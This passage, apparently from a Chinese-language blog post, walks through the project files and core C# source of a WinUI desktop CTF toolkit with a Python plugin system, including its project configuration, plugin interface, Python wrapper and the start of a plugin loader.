class="attr">&quot;**/.DS_Store&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;**/bin&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;**/obj&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;**/.venv&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;csharp.format.enable&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;csharp.suppressHiddenDiagnosticsWarnings&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;python.defaultInterpreterPath&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$&#123;workspaceFolder&#125;/.venv/Scripts/python.exe&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;python.autoComplete.extraPaths&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="string">&quot;$&#123;workspaceFolder&#125;/Assets/Python/Lib/site-packages&quot;</span></span><br><span class="line">    <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;editor.rulers&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="number">120</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;editor.formatOnSave&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;files.trimTrailingWhitespace&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;terminal.integrated.defaultProfile.windows&quot;</span><span class="punctuation">:</span> <span class="string">&quot;PowerShell&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h3 id="3-项目文件-CTFTool-csproj"><a href="#3-项目文件-CTFTool-csproj" class="headerlink" title="3. 项目文件 (CTFTool.csproj)"></a>3. 项目文件 (CTFTool.csproj)</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Project</span> <span class="attr">Sdk</span>=<span class="string">&quot;Microsoft.NET.Sdk&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">PropertyGroup</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">OutputType</span>&gt;</span>WinExe<span class="tag">&lt;/<span class="name">OutputType</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">TargetFramework</span>&gt;</span>net6.0-windows10.0.19041.0<span class="tag">&lt;/<span class="name">TargetFramework</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">TargetPlatformMinVersion</span>&gt;</span>10.0.17763.0<span class="tag">&lt;/<span class="name">TargetPlatformMinVersion</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">RootNamespace</span>&gt;</span>CTFTool<span class="tag">&lt;/<span class="name">RootNamespace</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ApplicationManifest</span>&gt;</span>app.manifest<span class="tag">&lt;/<span class="name">ApplicationManifest</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Platforms</span>&gt;</span>x64<span class="tag">&lt;/<span class="name">Platforms</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">RuntimeIdentifiers</span>&gt;</span>win10-x64<span class="tag">&lt;/<span class="name">RuntimeIdentifiers</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">UseWinUI</span>&gt;</span>true<span class="tag">&lt;/<span class="name">UseWinUI</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">EnableMsixTooling</span>&gt;</span>true<span class="tag">&lt;/<span class="name">EnableMsixTooling</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">PropertyGroup</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">ItemGroup</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">PackageReference</span> <span class="attr">Include</span>=<span class="string">&quot;Microsoft.Windows.SDK.BuildTools&quot;</span> <span class="attr">Version</span>=<span class="string">&quot;10.0.22621.756&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">PackageReference</span> <span class="attr">Include</span>=<span class="string">&quot;Microsoft.UI.Xaml&quot;</span> <span class="attr">Version</span>=<span class="string">&quot;2.8.4&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">PackageReference</span> <span class="attr">Include</span>=<span class="string">&quot;Python.Runtime&quot;</span> <span class="attr">Version</span>=<span class="string">&quot;3.0.1&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">PackageReference</span> <span class="attr">Include</span>=<span class="string">&quot;Newtonsoft.Json&quot;</span> <span class="attr">Version</span>=<span class="string">&quot;13.0.3&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">PackageReference</span> <span class="attr">Include</span>=<span class="string">&quot;WindowsAppSDK&quot;</span> <span class="attr">Version</span>=<span class="string">&quot;1.4.231008000&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">ItemGroup</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">ItemGroup</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Content</span> <span class="attr">Include</span>=<span class="string">&quot;Assets\**\*&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">CopyToOutputDirectory</span>&gt;</span>PreserveNewest<span class="tag">&lt;/<span class="name">CopyToOutputDirectory</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Content</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Content</span> <span class="attr">Include</span>=<span class="string">&quot;Plugins\**\*&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">CopyToOutputDirectory</span>&gt;</span>PreserveNewest<span class="tag">&lt;/<span class="name">CopyToOutputDirectory</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Content</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">ItemGroup</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">Target</span> <span class="attr">Name</span>=<span class="string">&quot;InstallPythonDependencies&quot;</span> <span class="attr">BeforeTargets</span>=<span class="string">&quot;Build&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Exec</span> <span class="attr">Command</span>=<span class="string">&quot;powershell -ExecutionPolicy Bypass -File <span class="symbol">&amp;quot;</span>$(ProjectDir)Install-PythonDependencies.ps1<span class="symbol">&amp;quot;</span>&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">Target</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Project</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="四、核心源代码实现"><a href="#四、核心源代码实现" class="headerlink" title="四、核心源代码实现"></a>四、核心源代码实现</h2><h3 id="1-插件接口定义-Interfaces-IPlugin-cs"><a href="#1-插件接口定义-Interfaces-IPlugin-cs" class="headerlink" title="1. 插件接口定义 (Interfaces/IPlugin.cs)"></a>1. 插件接口定义 (Interfaces/IPlugin.cs)</h3><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> Windows.UI.Xaml.Controls;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">CTFTool.Interfaces</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">interface</span> <span class="title">IPlugin</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 插件元数据</span></span><br><span class="line">        <span class="built_in">string</span> Name &#123; <span class="keyword">get</span>; &#125;</span><br><span class="line">        <span class="built_in">string</span> Description &#123; <span class="keyword">get</span>; &#125;</span><br><span class="line">        <span class="built_in">string</span> Version &#123; <span class="keyword">get</span>; &#125;</span><br><span class="line">        <span class="built_in">string</span> Author &#123; <span class="keyword">get</span>; &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 初始化插件</span></span><br><span class="line">        <span class="function"><span class="built_in">bool</span> <span class="title">Init</span>()</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 运行插件逻辑</span></span><br><span class="line">        <span class="function"><span class="built_in">object</span> <span class="title">Run</span>(<span class="params"><span class="built_in">dynamic</span> context</span>)</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 获取插件UI元素</span></span><br><span class="line">        <span class="function">UserControl <span class="title">GetUI</span>()</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 清理资源</span></span><br><span class="line">        <span class="function"><span class="keyword">void</span> <span class="title">Dispose</span>()</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-Python插件包装器-PluginSystem-PythonPluginWrapper-cs"><a href="#2-Python插件包装器-PluginSystem-PythonPluginWrapper-cs" class="headerlink" title="2. Python插件包装器 (PluginSystem/PythonPluginWrapper.cs)"></a>2. Python插件包装器 (PluginSystem/PythonPluginWrapper.cs)</h3><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> Windows.UI.Xaml.Controls;</span><br><span class="line"><span class="keyword">using</span> CTFTool.Interfaces;</span><br><span class="line"><span class="keyword">using</span> Python.Runtime;</span><br><span class="line"><span class="keyword">using</span> Newtonsoft.Json;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">CTFTool.PluginSystem</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">PythonPluginWrapper</span> : <span class="title">IPlugin</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">readonly</span> <span class="built_in">string</span> _pluginDir;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">readonly</span> PluginManifest _manifest;</span><br><span class="line">        <span class="keyword">private</span> <span class="built_in">dynamic</span> _pythonPlugin;</span><br><span class="line">        <span class="keyword">private</span> <span class="built_in">bool</span> _isInitialized;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">string</span> Name =&gt; _manifest.Name;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">string</span> Description =&gt; _manifest.Description;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">string</span> Version =&gt; _manifest.Version;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">string</span> Author =&gt; _manifest.Author;</span><br><span class="line">        </span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">PythonPluginWrapper</span>(<span class="params"><span class="built_in">string</span> pluginDir, PluginManifest manifest</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            _pluginDir = pluginDir;</span><br><span class="line">            _manifest = manifest;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="built_in">bool</span> <span class="title">Init</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">try</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// 初始化Python运行时</span></span><br><span class="line">                InitializePython();</span><br><span class="line">                </span><br><span class="line">                <span class="comment">// 添加插件目录到Python路径</span></span><br><span class="line">                <span class="keyword">using</span> (Py.GIL())</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="built_in">dynamic</span> sys = Py.Import(<span class="string">&quot;sys&quot;</span>);</span><br><span class="line">                    sys.path.append(_pluginDir);</span><br><span class="line">                    </span><br><span class="line">                    <span class="comment">// 导入Python插件模块</span></span><br><span class="line">                    <span class="keyword">var</span> moduleName = Path.GetFileNameWithoutExtension(_manifest.EntryPoint);</span><br><span class="line">                    <span class="built_in">dynamic</span> module = Py.Import(moduleName);</span><br><span class="line">                    </span><br><span class="line">                    <span class="comment">// 创建插件实例</span></span><br><span class="line">                    _pythonPlugin = module.Plugin();</span><br><span class="line">                    </span><br><span class="line">                    <span class="comment">// 调用Python插件的初始化方法</span></span><br><span class="line">                    <span class="keyword">if</span> (_pythonPlugin.Init() <span class="keyword">is</span> <span class="built_in">bool</span> initResult &amp;&amp; initResult)</span><br><span class="line">                    &#123;</span><br><span class="line">                        _isInitialized = <span class="literal">true</span>;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> (Exception ex)</span><br><span class="line">            &#123;</span><br><span class="line">                System.Diagnostics.Debug.WriteLine(<span class="string">$&quot;Python plugin initialization failed: <span class="subst">&#123;ex.Message&#125;</span>&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">InitializePython</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 检查Python是否已初始化</span></span><br><span class="line">            <span class="keyword">if</span> (!PythonEngine.IsInitialized)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// 设置Python路径</span></span><br><span class="line">                <span class="keyword">var</span> pythonHome = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, <span class="string">&quot;Assets&quot;</span>, <span class="string">&quot;Python&quot;</span>);</span><br><span class="line">                Environment.SetEnvironmentVariable(<span class="string">&quot;PYTHONHOME&quot;</span>, pythonHome);</span><br><span class="line">                </span><br><span class="line">                <span class="comment">// 初始化Python引擎</span></span><br><span class="line">                PythonEngine.Initialize();</span><br><span class="line">                </span><br><span class="line">                <span class="comment">// 设置Python标准输出重定向</span></span><br><span class="line">                PythonEngine.SetStdOut(Console.OpenStandardOutput());</span><br><span class="line">                PythonEngine.SetStdErr(Console.OpenStandardError());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="built_in">object</span> <span class="title">Run</span>(<span class="params"><span class="built_in">dynamic</span> context</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (!_isInitialized)</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> InvalidOperationException(<span class="string">&quot;Plugin not initialized&quot;</span>);</span><br><span class="line">                </span><br><span class="line">            <span class="keyword">try</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">using</span> (Py.GIL())</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="comment">// 将上下文对象序列化为JSON字符串</span></span><br><span class="line">                    <span class="keyword">var</span> contextJson = JsonConvert.SerializeObject(context);</span><br><span class="line">                    </span><br><span class="line">                    <span class="comment">// 调用Python插件的Run方法</span></span><br><span class="line">                    <span class="keyword">var</span> result = _pythonPlugin.Run(contextJson);</span><br><span class="line">                    </span><br><span class="line">                    <span class="comment">// 将Python结果转换为CLR对象</span></span><br><span class="line">                    <span class="keyword">if</span> (result <span class="keyword">is</span> PyDict pyDict)</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">return</span> JsonConvert.DeserializeObject&lt;<span class="built_in">dynamic</span>&gt;(pyDict.ToString());</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">return</span> result;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> (Exception ex)</span><br><span class="line">            &#123;</span><br><span class="line">                System.Diagnostics.Debug.WriteLine(<span class="string">$&quot;Python plugin execution failed: <span class="subst">&#123;ex.Message&#125;</span>&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="function"><span class="keyword">public</span> UserControl <span class="title">GetUI</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (!_isInitialized)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                </span><br><span class="line">            <span class="keyword">try</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">using</span> (Py.GIL())</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="comment">// 调用Python插件的GetUI方法获取HTML内容</span></span><br><span class="line">                    <span class="keyword">var</span> uiHtml = _pythonPlugin.GetUI();</span><br><span class="line">                    </span><br><span class="line">                    <span class="comment">// 创建WebView控件显示Python生成的UI</span></span><br><span class="line">                    <span class="keyword">var</span> webView = <span class="keyword">new</span> Windows.UI.Xaml.Controls.WebView();</span><br><span class="line">                    webView.NavigateToString(uiHtml);</span><br><span class="line">                    </span><br><span class="line">                    <span class="keyword">return</span> webView;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> (Exception ex)</span><br><span class="line">            &#123;</span><br><span class="line">                System.Diagnostics.Debug.WriteLine(<span class="string">$&quot;Python plugin UI generation failed: <span class="subst">&#123;ex.Message&#125;</span>&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> TextBlock &#123; Text = <span class="string">&quot;Failed to load plugin UI&quot;</span> &#125;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Dispose</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (_pythonPlugin != <span class="literal">null</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">try</span></span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">using</span> (Py.GIL())</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="comment">// 调用Python插件的Dispose方法</span></span><br><span class="line">                        <span class="keyword">if</span> (_pythonPlugin.Dispose != <span class="literal">null</span>)</span><br><span class="line">                        &#123;</span><br><span class="line">                            _pythonPlugin.Dispose();</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">catch</span> (Exception ex)</span><br><span class="line">                &#123;</span><br><span class="line">                    System.Diagnostics.Debug.WriteLine(<span class="string">$&quot;Python plugin disposal failed: <span class="subst">&#123;ex.Message&#125;</span>&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">finally</span></span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="comment">// 释放Python对象</span></span><br><span class="line">                    _pythonPlugin = <span class="literal">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 插件清单类</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">PluginManifest</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">string</span> Name &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">string</span> Description &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">string</span> Version &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">string</span> Author &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">string</span> EntryPoint &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">string</span>[] Dependencies &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-插件加载器-PluginSystem-PluginLoader-cs"><a href="#3-插件加载器-PluginSystem-PluginLoader-cs" class="headerlink" title="3. 插件加载器 (PluginSystem/PluginLoader.cs)"></a>3. 插件加载器 (PluginSystem/PluginLoader.cs)</h3><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.Linq;</span><br><span class="line"><span class="keyword">using</span> System.Reflection;</span><br><span class="line"><span class="keyword">using</span> CTFTool.Interfaces;</span><br><span class="line"><span class="keyword">using</span> Newtonsoft.Json;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">CTFTool.PluginSystem</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">PluginLoader</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">readonly</span> <span class="built_in">string</span> _pluginsDirectory;</span><br><span class="line">        </span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">PluginLoader</span>(<span class="params"><span class="built_in">string</span> pluginsDirectory</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            _pluginsDirectory = pluginsDirectory;</span><br><span class="line">            EnsureDirectoryExists();</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">EnsureDirectoryExists</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (!Directory.Exists(_pluginsDirectory))</span><br><span class="line">            &#123;</span><br><span class="line">                Directory.CreateDirectory(_pluginsDirectory);</span><br><span class="line">            